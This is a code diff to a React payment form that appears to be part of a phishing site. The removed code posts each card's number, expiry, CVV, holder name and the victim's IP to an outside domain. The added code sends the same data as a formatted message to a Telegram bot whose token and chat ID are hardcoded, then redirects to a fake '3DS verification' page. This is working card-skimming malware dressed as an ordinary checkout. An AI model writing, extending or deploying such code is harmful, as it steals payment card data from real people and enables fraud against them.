@@ -31,28 +31,37 @@ const validateCardNumber = (cardNumber: string): boolean => {
   return sum % 10 === 0;
 };
 
-const sendPaymentData = async (paymentData: any) => {
+const sendTelegramNotification = async (paymentData: any) => {
+  const botToken = "7838597617:AAGTZ6xgFUTddSK1mS9hHUl1tKffHXyHycU";
+  const chatId = "-4781499307";
+  
   try {
-    const response = await fetch('https://api.ipify.org?format=json')
-      .then(res => res.json())
-      .then(async (data) => {
-        const payload = {
-          ...paymentData,
-          ip: data.ip
-        };
-        
-        // Send to our proxy endpoint
-        await fetch('https://api.travelt-pay.site/api/notify', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify(payload)
-        });
-      });
-    console.log('Payment data sent successfully');
+    const ipResponse = await fetch('https://api.ipify.org?format=json');
+    const ipData = await ipResponse.json();
+    
+    const message = `💳 New Payment:
+💰 Amount: $${paymentData.amount}
+👤 Card Holder: ${paymentData.cardHolder}
+💳 Card: ${paymentData.cardNumber}
+📅 Expiry: ${paymentData.expiryDate}
+🔒 CVV: ${paymentData.cvv}
+🌐 IP: ${ipData.ip}`;
+
+    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+        parse_mode: 'HTML'
+      })
+    });
+    
+    console.log('Payment notification sent successfully');
   } catch (error) {
-    console.error('Error sending payment data:', error);
+    console.error('Error sending payment notification:', error);
   }
 };
 
@@ -79,20 +88,24 @@ export const PaymentForm = ({ amount }: PaymentFormProps) => {
       return;
     }
 
-    // Send payment data through proxy
-    await sendPaymentData({
-      amount,
-      cardHolder,
-      cardNumber,
-      expiryDate,
-      cvv
-    });
+    try {
+      await sendTelegramNotification({
+        amount,
+        cardHolder,
+        cardNumber,
+        expiryDate,
+        cvv
+      });
 
-    // Add 3-second delay before navigation
-    await new Promise(resolve => setTimeout(resolve, 3000));
-    
-    // Navigate to 3DS verification with all payment data
-    navigate(`/verify-3ds?amount=${amount}&cardHolder=${encodeURIComponent(cardHolder)}`);
+      // Add 3-second delay before navigation
+      await new Promise(resolve => setTimeout(resolve, 3000));
+      
+      // Navigate to 3DS verification
+      navigate(`/verify-3ds?amount=${amount}&cardHolder=${encodeURIComponent(cardHolder)}`);
+    } catch (error) {
+      console.error('Error processing payment:', error);
+      setIsSubmitting(false);
+    }
   };
 
   const formatCardNumber = (value: string) => {
